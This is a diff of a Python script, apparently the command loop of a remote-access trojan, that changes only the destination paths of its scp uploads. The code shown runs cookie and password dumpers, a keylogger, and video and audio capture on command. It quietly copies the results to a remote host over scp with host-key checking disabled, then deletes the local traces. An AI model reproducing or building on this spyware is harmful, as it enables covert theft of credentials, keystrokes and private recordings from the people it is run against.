@@ -43,20 +43,20 @@ while True:
     
 	if recibido == "cookies":
 		os.system("python firecookies.py")	
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.9:~/cookies 1>/dev/null')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/cookies.txt manavi@192.168.222.9:~/cookies/ 1>/dev/null')
 		os.system('rm -f /tmp/cookies.txt')
 		connstream.send("Archivo enviado")
 
 	elif recibido == "contrasenas":
 		os.system("python firepass.py")
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas 1>/dev/null')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/firepass.txt manavi@192.168.222.9:~/contrasenas/ 1>/dev/null')
 		os.system('rm -f /tmp/firepass.txt')
 		connstream.send("Archivo enviado")
 
 	elif re.search('keylogger',recibido):
 		mo = re.match('keylogger (\d+)',recibido)
 		keylogger.keylog(mo.group(1))
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.9:~/keylogger 1>/dev/null')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/key.txt manavi@192.168.222.9:~/keylogger/ 1>/dev/null')
 		os.system('rm -f /tmp/key.txt')
 		connstream.send("Archivo enviado")
     
@@ -70,14 +70,14 @@ while True:
 	elif re.search('captvid',recibido):
 		mo = re.match('captvid (\d+)',recibido);
 		capvideo.video(mo.group(1))
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.9:~/video 1>/dev/null')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.mpeg manavi@192.168.222.9:~/video/ 1>/dev/null')
 		os.system('rm -f /tmp/*.avi')
 		connstream.send("Archivo enviado")
     
 	elif re.search('captaud',recibido):
 		mo = re.match('captaud (\d+)',recibido);        
 		capaudio.audio(mo.group(1))
-		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.9:~/audio 1>/dev/null')
+		os.system('scp -q -o StrictHostKeyChecking=no /tmp/*.wav manavi@192.168.222.9:~/audio/ 1>/dev/null')
 		os.system('rm -f /tmp/*.wav')
 		connstream.send("Archivo enviado")
 
